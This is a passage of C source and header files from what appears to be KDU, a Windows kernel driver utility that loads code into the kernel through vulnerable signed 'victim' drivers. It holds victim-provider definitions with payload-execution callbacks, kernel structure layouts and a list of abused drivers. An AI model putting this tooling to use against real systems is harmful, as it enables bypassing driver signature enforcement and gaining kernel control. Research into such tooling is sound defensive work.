            PRTL_PROCESS_MODULES modulesList = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
            if (modulesList) {

                ANSI_STRING driverNameAs;
                UNICODE_STRING driverNameUs;

                WCHAR szTargetDriver[MAX_PATH];

                StringCchPrintf(szTargetDriver, MAX_PATH, L"%ws.sys", Context->Name);
                RtlInitUnicodeString(&driverNameUs, szTargetDriver);

                driverNameAs.Buffer = NULL;
                driverNameAs.Length = driverNameAs.MaximumLength = 0;

                NTSTATUS ntStatus;

                ntStatus = RtlUnicodeStringToAnsiString(&driverNameAs, &driverNameUs, TRUE);
                if (NT_SUCCESS(ntStatus) && driverNameAs.Buffer) {

                    target = (PRTL_PROCESS_MODULE_INFORMATION)ntsupFindModuleEntryByName(modulesList, driverNameAs.Buffer);
                    if (target) {
                        driverInfo->LoadedImageBase = (ULONG_PTR)target->ImageBase;
                        driverInfo->ImageSize = target->ImageSize;
                    }

                    RtlFreeAnsiString(&driverNameAs);
                }
                else {
                    SetLastError(RtlNtStatusToDosError(ntStatus));
                    bResult = FALSE;
                }
                supHeapFree(modulesList);
            }
            else {
                SetLastError(ERROR_INTERNAL_ERROR);
                bResult = FALSE;
            }
        }
        else {
            SetLastError(ERROR_INVALID_PARAMETER);
            bResult = FALSE;
        }

        break;

    case VictimRopChainInformation:
        UNREFERENCED_PARAMETER(Information);
        bResult = FALSE;
        break;

    default:
        UNREFERENCED_PARAMETER(Information);
        bResult = FALSE;
        break;
    }

    return bResult;
}

```

`Source/Hamakaze/victim.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2023
*
*  TITLE:       VICTIM.H
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  Victim support prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

typedef BOOL(WINAPI* pfnVictimCreate)(
    _In_opt_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name,
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID *VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
    );

typedef BOOL(WINAPI* pfnVictimRelease)(
    _In_ LPCWSTR Name
    );

typedef VOID(WINAPI* pfnVictimExecute)(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle
    );

typedef enum _VICTIM_INFORMATION {
    VictimImageInformation = 0,
    VictimDriverInformation,
    VictimRopChainInformation,
    MaxVictimInformation
} VICTIM_INFORMATION;

typedef struct _VICTIM_IMAGE_INFORMATION {
    ULONG DispatchOffset;
    ULONG DispatchPageOffset;
    ULONG JumpValue;
} VICTIM_IMAGE_INFORMATION, * PVICTIM_IMAGE_INFORMATION;

typedef struct _VICTIM_DRIVER_INFORMATION {
    ULONG_PTR LoadedImageBase;
    ULONG ImageSize;
} VICTIM_DRIVER_INFORMATION, * PVICTIM_DRIVER_INFORMATION;

typedef struct _VICTIM_LOAD_PARAMETERS {
    struct _KDU_VICTIM_PROVIDER *Provider;
} VICTIM_LOAD_PARAMETERS, * PVICTIM_LOAD_PARAMETERS;

//
// No optional victim flags specified, this is default value.
//
#define KDU_VICTIM_FLAGS_NONE               0x00000000

//
// Victim can be reloaded.
//
#define KDU_VICTIM_FLAGS_SUPPORT_RELOAD     0x00000001

typedef struct _KDU_VICTIM_PROVIDER {
    LPCWSTR Name; //same as device name
    LPCWSTR Desc; //optional
    ULONG ResourceId;
    ULONG VictimId;
    ACCESS_MASK DesiredAccess;
    union {
        ULONG Flags;
        struct {
            ULONG SupportReload : 1;
            ULONG Reserved : 31;
        };
    };
    struct {
        pfnVictimCreate Create;
        pfnVictimRelease Release;
        pfnVictimExecute Execute;
    } Callbacks;

    struct {
        PVOID DispatchSignature;
        ULONG DispatchSignatureLength;
        PVOID VictimImage;
    } Data;

} KDU_VICTIM_PROVIDER, * PKDU_VICTIM_PROVIDER;

BOOL VpCreate(
    _Inout_ PKDU_VICTIM_PROVIDER Context,
    _In_opt_ HINSTANCE ModuleBase,
    _Out_opt_ PHANDLE VictimHandle,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam);

BOOL VpRelease(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Inout_opt_ PHANDLE VictimHandle);

VOID VpExecutePayload(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _Out_opt_ PHANDLE VictimHandle);

BOOL VpCreateCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name,
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam);

BOOL VpReleaseCallback(
    _In_ LPCWSTR Name);

VOID VpExecuteCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle);

BOOL VpCreateFromExistingCallback(
    _In_ HINSTANCE ModuleBase,
    _In_ LPCWSTR Name,
    _In_ ULONG ResourceId,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE VictimHandle,
    _Out_opt_ PVOID* VictimImage,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam);

VOID VpExecuteFromExistingCallback(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle);

VOID VpExecuteCallbackEx(
    _In_ LPCWSTR Name,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE VictimHandle);

BOOL VpReleaseCallbackStub(
    _In_ LPCWSTR Name);

NTSTATUS CALLBACK VpLoadDriverCallback(
    _In_ PUNICODE_STRING RegistryPath,
    _In_opt_ PVOID Param);

_Success_(return != FALSE)
BOOL VpQueryInformation(
    _In_ PKDU_VICTIM_PROVIDER Context,
    _In_ VICTIM_INFORMATION VictimInformationClass,
    _Inout_ PVOID Information,
    _In_ ULONG InformationLength);

```

`Source/Hamakaze/wdksup.h`:

```h
/************************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2018 - 2023, translated from Microsoft sources/debugger
*
*  TITLE:       WDKSUP.H
*
*  VERSION:     1.33
*
*  DATE:        16 Jul 2023
*
*  Header file for NT WDK definitions.
*
*  WARNING: some structures are opaque and incomplete.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
************************************************************************************/
#pragma once

#define IO_NO_INCREMENT 0

//
// Processor modes.
//

#ifndef NTOS_RTL

typedef CCHAR KPROCESSOR_MODE;

typedef enum _MODE {
    KernelMode,
    UserMode,
    MaximumMode
} MODE;

#endif

#define FIXED_UNICODE_STRING_LENGTH MAX_PATH

typedef struct _FIXED_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    WCHAR Buffer[FIXED_UNICODE_STRING_LENGTH];
} FIXED_UNICODE_STRING, * PFIXED_UNICODE_STRING;

typedef _Enum_is_bitflag_ enum _WORK_QUEUE_TYPE {
    CriticalWorkQueue,
    DelayedWorkQueue,
    HyperCriticalWorkQueue,
    NormalWorkQueue,
    BackgroundWorkQueue,
    RealTimeWorkQueue,
    SuperCriticalWorkQueue,
    MaximumWorkQueue,
    CustomPriorityWorkQueue = 32
} WORK_QUEUE_TYPE;

typedef int CM_RESOURCE_TYPE;

// CmResourceTypeNull is reserved

#define CmResourceTypeNull                0   // ResType_All or ResType_None (0x0000)
#define CmResourceTypePort                1   // ResType_IO (0x0002)
#define CmResourceTypeInterrupt           2   // ResType_IRQ (0x0004)
#define CmResourceTypeMemory              3   // ResType_Mem (0x0001)
#define CmResourceTypeDma                 4   // ResType_DMA (0x0003)
#define CmResourceTypeDeviceSpecific      5   // ResType_ClassSpecific (0xFFFF)
#define CmResourceTypeBusNumber           6   // ResType_BusNumber (0x0006)
#define CmResourceTypeMemoryLarge         7   // ResType_MemLarge (0x0007)
#define CmResourceTypeNonArbitrated     128   // Not arbitrated if 0x80 bit set
#define CmResourceTypeConfigData        128   // ResType_Reserved (0x8000)
#define CmResourceTypeDevicePrivate     129   // ResType_DevicePrivate (0x8001)
#define CmResourceTypePcCardConfig      130   // ResType_PcCardConfig (0x8002)
#define CmResourceTypeMfCardConfig      131   // ResType_MfCardConfig (0x8003)
#define CmResourceTypeConnection        132   // ResType_Connection (0x8004)

#define CM_RESOURCE_MEMORY_LARGE_40  0x0200
#define CM_RESOURCE_MEMORY_LARGE_48  0x0400
#define CM_RESOURCE_MEMORY_LARGE_64  0x0800
#define CM_RESOURCE_MEMORY_LARGE     (CM_RESOURCE_MEMORY_LARGE_40 | CM_RESOURCE_MEMORY_LARGE_48 | CM_RESOURCE_MEMORY_LARGE_64)

//
// Define the bit masks for Flags when type is CmResourceTypeMemory
// or CmResourceTypeMemoryLarge
//

#define CM_RESOURCE_MEMORY_READ_WRITE                       0x0000
#define CM_RESOURCE_MEMORY_READ_ONLY                        0x0001
#define CM_RESOURCE_MEMORY_WRITE_ONLY                       0x0002
#define CM_RESOURCE_MEMORY_WRITEABILITY_MASK                0x0003
#define CM_RESOURCE_MEMORY_PREFETCHABLE                     0x0004

#define CM_RESOURCE_MEMORY_COMBINEDWRITE                    0x0008
#define CM_RESOURCE_MEMORY_24                               0x0010
#define CM_RESOURCE_MEMORY_CACHEABLE                        0x0020
#define CM_RESOURCE_MEMORY_WINDOW_DECODE                    0x0040
#define CM_RESOURCE_MEMORY_BAR                              0x0080

#define CM_RESOURCE_MEMORY_COMPAT_FOR_INACCESSIBLE_RANGE    0x0100

//
// Define limits for large memory resources
//

#define CM_RESOURCE_MEMORY_LARGE_40_MAXLEN          0x000000FFFFFFFF00
#define CM_RESOURCE_MEMORY_LARGE_48_MAXLEN          0x0000FFFFFFFF0000
#define CM_RESOURCE_MEMORY_LARGE_64_MAXLEN          0xFFFFFFFF00000000

#include "pshpack4.h"
typedef struct _CM_PARTIAL_RESOURCE_DESCRIPTOR {
    UCHAR Type;
    UCHAR ShareDisposition;
    USHORT Flags;
    union {

        //
        // Range of resources, inclusive.  These are physical, bus relative.
        // It is known that Port and Memory below have the exact same layout
        // as Generic.
        //

        struct {
            PHYSICAL_ADDRESS Start;
            ULONG Length;
        } Generic;

        //
        //

        struct {
            PHYSICAL_ADDRESS Start;
            ULONG Length;
        } Port;

        //
        //

        struct {
#if defined(NT_PROCESSOR_GROUPS)
            USHORT Level;
            USHORT Group;
#else
            ULONG Level;
#endif
            ULONG Vector;
            KAFFINITY Affinity;
        } Interrupt;

        //
        // Values for message signaled interrupts are distinct in the
        // raw and translated cases.
        //

        struct {
            union {
                struct {
#if defined(NT_PROCESSOR_GROUPS)
                    USHORT Group;
#else
                    USHORT Reserved;
#endif
                    USHORT MessageCount;
                    ULONG Vector;
                    KAFFINITY Affinity;
                } Raw;

                struct {
#if defined(NT_PROCESSOR_GROUPS)
                    USHORT Level;
                    USHORT Group;
#else
                    ULONG Level;
#endif
                    ULONG Vector;
                    KAFFINITY Affinity;
                } Translated;
            } DUMMYUNIONNAME;
        } MessageInterrupt;

        //
        // Range of memory addresses, inclusive. These are physical, bus
        // relative. The value should be the same as the one passed to
        // HalTranslateBusAddress().
        //

        struct {
            PHYSICAL_ADDRESS Start;    // 64 bit physical addresses.
            ULONG Length;
        } Memory;

        //
        // Physical DMA channel.
        //

        struct {
            ULONG Channel;
            ULONG Port;
            ULONG Reserved1;
        } Dma;

        //
        // Device driver private data, usually used to help it figure
        // what the resource assignments decisions that were made.
        //

        struct {
            ULONG Data[3];
        } DevicePrivate;

        //
        // Bus Number information.
        //

        struct {
            ULONG Start;
            ULONG Length;
            ULONG Reserved;
        } BusNumber;

        //
        // Device Specific information defined by the driver.
        // The DataSize field indicates the size of the data in bytes. The
        // data is located immediately after the DeviceSpecificData field in
        // the structure.
        //

        struct {
            ULONG DataSize;
            ULONG Reserved1;
            ULONG Reserved2;
        } DeviceSpecificData;

        // The following structures provide support for memory-mapped
        // IO resources greater than MAXULONG
        struct {
            PHYSICAL_ADDRESS Start;
            ULONG Length40;
        } Memory40;

        struct {
            PHYSICAL_ADDRESS Start;
            ULONG Length48;
        } Memory48;

        struct {
            PHYSICAL_ADDRESS Start;
            ULONG Length64;
        } Memory64;


    } u;
} CM_PARTIAL_RESOURCE_DESCRIPTOR, * PCM_PARTIAL_RESOURCE_DESCRIPTOR;
#include "poppack.h"

//
// A Partial Resource List is what can be found in the ARC firmware
// or will be generated by ntdetect.com.
// The configuration manager will transform this structure into a Full
// resource descriptor when it is about to store it in the regsitry.
//
// Note: There must a be a convention to the order of fields of same type,
// (defined on a device by device basis) so that the fields can make sense
// to a driver (i.e. when multiple memory ranges are necessary).
//

typedef struct _CM_PARTIAL_RESOURCE_LIST {
    USHORT Version;
    USHORT Revision;
    ULONG Count;
    CM_PARTIAL_RESOURCE_DESCRIPTOR PartialDescriptors[1];
} CM_PARTIAL_RESOURCE_LIST, * PCM_PARTIAL_RESOURCE_LIST;

//
// A Full Resource Descriptor is what can be found in the registry.
// This is what will be returned to a driver when it queries the registry
// to get device information; it will be stored under a key in the hardware
// description tree.
//
// Note: There must a be a convention to the order of fields of same type,
// (defined on a device by device basis) so that the fields can make sense
// to a driver (i.e. when multiple memory ranges are necessary).
//

typedef struct _CM_FULL_RESOURCE_DESCRIPTOR {
    INTERFACE_TYPE InterfaceType; // unused for WDM
    ULONG BusNumber; // unused for WDM
    CM_PARTIAL_RESOURCE_LIST PartialResourceList;
} CM_FULL_RESOURCE_DESCRIPTOR, * PCM_FULL_RESOURCE_DESCRIPTOR;

//
// The Resource list is what will be stored by the drivers into the
// resource map via the IO API.
//

typedef struct _CM_RESOURCE_LIST {
    ULONG Count;
    CM_FULL_RESOURCE_DESCRIPTOR List[1];
} CM_RESOURCE_LIST, * PCM_RESOURCE_LIST;

//x64
typedef struct _MMPTE_HARDWARE {
    union {
        ULONGLONG Flags;
        struct {
            ULONGLONG Valid : 1;
            ULONGLONG Dirty1 : 1;
            ULONGLONG Owner : 1;
            ULONGLONG WriteThrough : 1;
            ULONGLONG CacheDisable : 1;
            ULONGLONG Accessed : 1;
            ULONGLONG Dirty : 1;
            ULONGLONG LargePage : 1;
            ULONGLONG Global : 1;
            ULONGLONG CopyOnWrite : 1;
            ULONGLONG Unused : 1;
            ULONGLONG Write : 1;
            ULONGLONG PageFrameNumber : 40;
            ULONGLONG ReservedForSoftware : 4;
            ULONGLONG WsleAge : 4;
            ULONGLONG WsleProtection : 3;
            ULONGLONG NoExecute : 1;
        };
    };
} MMPTE_HARDWARE, * PMMPTE_HARDWARE;

typedef union _tagMMPTE {
    ULONGLONG Value;
    MMPTE_HARDWARE HardwarePte;
} MMPTE, *PMMPTE;

typedef struct _MI_PTE_HIERARCHY {
    ULONG_PTR PXE;
    ULONG_PTR PPE;
    ULONG_PTR PDE;
    ULONG_PTR PTE;
} MI_PTE_HIERARCHY, * PMI_PTE_HIERARCHY;

typedef
VOID
WORKER_THREAD_ROUTINE(
    _In_ PVOID Parameter);

typedef WORKER_THREAD_ROUTINE* PWORKER_THREAD_ROUTINE;
typedef VOID* PACCESS_STATE;

typedef
NTSTATUS
DRIVER_INITIALIZE(
    _In_ struct _DRIVER_OBJECT* DriverObject,
    _In_ PUNICODE_STRING RegistryPath);

typedef DRIVER_INITIALIZE* PDRIVER_INITIALIZE;

typedef struct _WORK_QUEUE_ITEM {
    LIST_ENTRY List;
    PWORKER_THREAD_ROUTINE WorkerRoutine;
    __volatile PVOID Parameter;
} WORK_QUEUE_ITEM, * PWORK_QUEUE_ITEM;

typedef NTSTATUS(NTAPI* pfnDriverEntry)();

typedef BOOLEAN (NTAPI *pfnRtlCreateUnicodeString)(
    _Out_ _At_(DestinationString->Buffer, __drv_allocatesMem(Mem))
    PUNICODE_STRING DestinationString,
    _In_z_ PCWSTR SourceString);

typedef NTSTATUS (WINAPI *pfnIoCreateDriver)(
    _In_ PUNICODE_STRING DriverName, OPTIONAL
    _In_ PDRIVER_INITIALIZE InitializationFunction);

typedef VOID(NTAPI* pfnExQueueWorkItem)(
    _Inout_ PWORK_QUEUE_ITEM WorkItem,
    _In_ WORK_QUEUE_TYPE QueueType);

typedef NTSTATUS(NTAPI* pfnZwOpenSection)(
    _Out_ PHANDLE SectionHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS(NTAPI* pfnZwMapViewOfSection)(
    _In_ HANDLE SectionHandle,
    _In_ HANDLE ProcessHandle,
    _Inout_ _At_(*BaseAddress, _Readable_bytes_(*ViewSize) _Writable_bytes_(*ViewSize) _Post_readable_byte_size_(*ViewSize)) PVOID* BaseAddress,
    _In_ ULONG_PTR ZeroBits,
    _In_ SIZE_T CommitSize,
    _Inout_opt_ PLARGE_INTEGER SectionOffset,
    _Inout_ PSIZE_T ViewSize,
    _In_ SECTION_INHERIT InheritDisposition,
    _In_ ULONG AllocationType,
    _In_ ULONG Win32Protect);

typedef NTSTATUS(NTAPI* pfnZwUnmapViewOfSection)(
    _In_ HANDLE ProcessHandle,
    _In_opt_ PVOID BaseAddress);

typedef ULONG(NTAPI* pfnDbgPrint)(
    _In_ PCHAR Format,
    ...);

typedef PVOID(NTAPI* pfnExAllocatePool)(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes);

typedef PVOID(NTAPI* pfnExAllocatePoolWithTag)(
    _In_ POOL_TYPE PoolType,
    _In_ SIZE_T NumberOfBytes,
    _In_ ULONG Tag);

typedef VOID(NTAPI* pfnExFreePoolWithTag)(
    _In_ PVOID P,
    _In_ ULONG Tag);

typedef PVOID (NTAPI* pfnMmGetSystemRoutineAddress)(
    _In_ PUNICODE_STRING SystemRoutineName);

typedef NTSTATUS(NTAPI* pfnPsCreateSystemThread)(
    _Out_ PHANDLE ThreadHandle,
    _In_ ULONG DesiredAccess,
    _In_opt_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_opt_  HANDLE ProcessHandle,
    _Out_opt_ PCLIENT_ID ClientId,
    _In_ PKSTART_ROUTINE StartRoutine,
    _In_opt_ PVOID StartContext);

typedef NTSTATUS(NTAPI* pfnZwClose)(
    _In_ HANDLE Handle);

typedef VOID(NTAPI* pfnIofCompleteRequest)(
    _In_ VOID* Irp,
    _In_ CCHAR PriorityBoost);

typedef NTSTATUS(NTAPI* pfnObReferenceObjectByHandle)(
    _In_ HANDLE Handle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_opt_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Out_ PVOID* Object,
    _Out_opt_ PVOID HandleInformation);

typedef VOID(NTAPI* pfnObfDereferenceObject)(
    _In_ PVOID Object);

typedef NTSTATUS(NTAPI* pfnKeSetEvent)(
    _In_ PKEVENT Event,
    _In_ KPRIORITY Increment,
    _In_ _Literal_ BOOLEAN Wait);

typedef NTSTATUS(NTAPI* pfnObCreateObject)(
    _In_ KPROCESSOR_MODE ProbeMode,
    _In_ POBJECT_TYPE ObjectType,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ KPROCESSOR_MODE OwnershipMode,
    _Inout_opt_ PVOID ParseContext,
    _In_ ULONG ObjectBodySize,
    _In_ ULONG PagedPoolCharge,
    _In_ ULONG NonPagedPoolCharge,
    _Out_ PVOID* Object);

typedef NTSTATUS(NTAPI* pfnObInsertObject)(
    _In_ PVOID Object,
    _Inout_opt_ PACCESS_STATE AccessState,
    _Inout_opt_ ACCESS_MASK DesiredAccess,
    _In_ ULONG ObjectPointerBias,
    _Out_opt_ PVOID* NewObject,
    _Out_opt_ PHANDLE Handle);

typedef VOID(NTAPI* pfnObMakeTemporaryObject)(
    _In_ PVOID Object);

typedef NTSTATUS(NTAPI *pfnZwMakeTemporaryObject)(
    _In_ HANDLE Handle);

typedef
VOID
(NTAPI* PIO_APC_ROUTINE) (
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

typedef struct _IO_STACK_LOCATION {
    UCHAR MajorFunction;
    UCHAR MinorFunction;
    UCHAR Flags;
    UCHAR Control;
    //incomplete
} IO_STACK_LOCATION, * PIO_STACK_LOCATION;

typedef struct _KAPC {
    UCHAR Type;
    UCHAR SpareByte0;
    UCHAR Size;
    UCHAR SpareByte1;
    ULONG SpareLong0;
    struct _KTHREAD* Thread;
    LIST_ENTRY ApcListEntry;
    PVOID Reserved[3];
    PVOID NormalContext;
    PVOID SystemArgument1;
    PVOID SystemArgument2;
    CCHAR ApcStateIndex;
    KPROCESSOR_MODE ApcMode;
    BOOLEAN Inserted;
} KAPC, * PKAPC, * PRKAPC;

#pragma warning(push)
#pragma warning(disable:4324) // structure padded due to __declspec(align())
typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _IRP {
    CSHORT Type;
    USHORT Size;
    PVOID MdlAddress;
    ULONG Flags;

    union {
        struct _IRP* MasterIrp;
        __volatile LONG IrpCount;
        PVOID SystemBuffer;
    } AssociatedIrp;

    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    KPROCESSOR_MODE RequestorMode;
    BOOLEAN PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    BOOLEAN Cancel;
    KIRQL CancelIrql;
    CCHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PIO_STATUS_BLOCK UserIosb;
    PVOID UserEvent;
    union {
        struct {
            union {
                PIO_APC_ROUTINE UserApcRoutine;
                PVOID IssuingProcess;
            };
            PVOID UserApcContext;
        } AsynchronousParameters;
        LARGE_INTEGER AllocationSize;
    } Overlay;

    __volatile PVOID CancelRoutine;

    PVOID UserBuffer;

    union {

        struct {

            union {

                KDEVICE_QUEUE_ENTRY DeviceQueueEntry;

                struct {
                    PVOID DriverContext[4];
                };

            };

            PVOID Thread;
            PCHAR AuxiliaryBuffer;

            struct {

                LIST_ENTRY ListEntry;

                union {

                    struct _IO_STACK_LOCATION* CurrentStackLocation;
                    ULONG PacketType;
                };
            };

            PVOID OriginalFileObject;

        } Overlay;

        //incomplete

    } Tail;

} IRP;
#pragma warning(pop)

typedef IRP* PIRP;

FORCEINLINE
PIO_STACK_LOCATION
IoGetCurrentIrpStackLocation(
    _In_ PIRP Irp
)
{
    return Irp->Tail.Overlay.CurrentStackLocation;
}

```

`Source/KDU.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.29709.97
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Taigei", "Taigei\Taigei.vcxproj", "{82970D46-0966-4D20-9158-C0EB05090488}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Tanikaze", "Tanikaze\Tanikaze.vcxproj", "{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}"
EndProject
Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Dlls", "Dlls", "{0BB4D8FA-8E46-4947-900A-9BEE39816DCF}"
EndProject
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "Hamakaze", "Hamakaze\KDU.vcxproj", "{46C8FB0F-C8BF-4932-B84C-A10B38904728}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|Win32 = Debug|Win32
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|Win32 = Release|Win32
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|Win32.ActiveCfg = Debug|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|Win32.Build.0 = Debug|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|x64.ActiveCfg = Debug|x64
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|x64.Build.0 = Debug|x64
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|x86.ActiveCfg = Debug|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Debug|x86.Build.0 = Debug|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Release|Win32.ActiveCfg = Release|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Release|x64.ActiveCfg = Release|x64
		{82970D46-0966-4D20-9158-C0EB05090488}.Release|x64.Build.0 = Release|x64
		{82970D46-0966-4D20-9158-C0EB05090488}.Release|x86.ActiveCfg = Release|Win32
		{82970D46-0966-4D20-9158-C0EB05090488}.Release|x86.Build.0 = Release|Win32
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Debug|Win32.ActiveCfg = Debug|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Debug|x64.ActiveCfg = Debug|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Debug|x64.Build.0 = Debug|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Debug|x86.ActiveCfg = Debug|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Release|Win32.ActiveCfg = Release|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Release|x64.ActiveCfg = Release|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Release|x64.Build.0 = Release|x64
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E}.Release|x86.ActiveCfg = Release|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Debug|Win32.ActiveCfg = Debug|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Debug|x64.ActiveCfg = Debug|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Debug|x64.Build.0 = Debug|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Debug|x86.ActiveCfg = Debug|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Release|Win32.ActiveCfg = Release|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Release|x64.ActiveCfg = Release|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Release|x64.Build.0 = Release|x64
		{46C8FB0F-C8BF-4932-B84C-A10B38904728}.Release|x86.ActiveCfg = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(NestedProjects) = preSolution
		{82970D46-0966-4D20-9158-C0EB05090488} = {0BB4D8FA-8E46-4947-900A-9BEE39816DCF}
		{072F189A-CEA9-4CA8-A0FA-1257A7524A8E} = {0BB4D8FA-8E46-4947-900A-9BEE39816DCF}
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {A3AB05D5-3256-4A90-8B28-22C0E11621E9}
	EndGlobalSection
EndGlobal

```

`Source/Shared/consts.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2026
*
*  TITLE:       CONSTS.H
*
*  VERSION:     1.46
*
*  DATE:        12 Feb 2026
*
*  Global consts.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#define KDU_VERSION_MAJOR       1
#define KDU_VERSION_MINOR       4
#define KDU_VERSION_REVISION    6
#define KDU_VERSION_BUILD       2602
#define KDU_COPYRIGHT_YEAR      2026

#define KDU_MIN_NTBUILDNUMBER   0x1DB1      //Windows 7 SP1
#define KDU_MAX_NTBUILDNUMBER   0xFFFFFFFF  //Undefined

#define IPC_GET_HANDLE          0x1337

#define KDU_SYNC_MUTANT         0x2602

#define NT_REG_PREP             L"\\Registry\\Machine"
#define DRIVER_REGKEY           L"%wS\\System\\CurrentControlSet\\Services\\%wS"
#define WDAC_POLICY_FILE        L"\\systemroot\\system32\\CodeIntegrity\\driversipolicy.p7b"

#define PROCEXP152              L"PROCEXP152"
#define PROCEXP1627_DESC        L"Process Explorer v16"
#define PROCEXP1702_DESC        L"Process Explorer v17"

#define NTOSKRNL_EXE            L"ntoskrnl.exe"
#define CI_DLL                  L"CI.dll"

#define DRV64DLL                L"drv64.dll"
#define DUMMYDLL                L"SB_SMBUS_SDK.dll"

#define WINIO_BASE_DESC         "WinIo by Yariv Kaplan"
#define WINRING0_BASE_DESC      "WinRing0 by Noriyuki Miyazaki"
#define MAPMEM_BASE_DESC        "MapMem from NTDDK 3.51"
#define PHYMEM_BASE_DESC        "PhyMem by akui"
#define RWEVERYTHING_BASE_DESC  "RWEverything by ckimchan.tw"

#define ZODIACON_SYSEXP_EXE     L"SysExp.exe"
#define ZODIACON_REGEXP_EXE     L"RegExp.exe"

#define CPU_VENDOR_INTEL        "GenuineIntel"
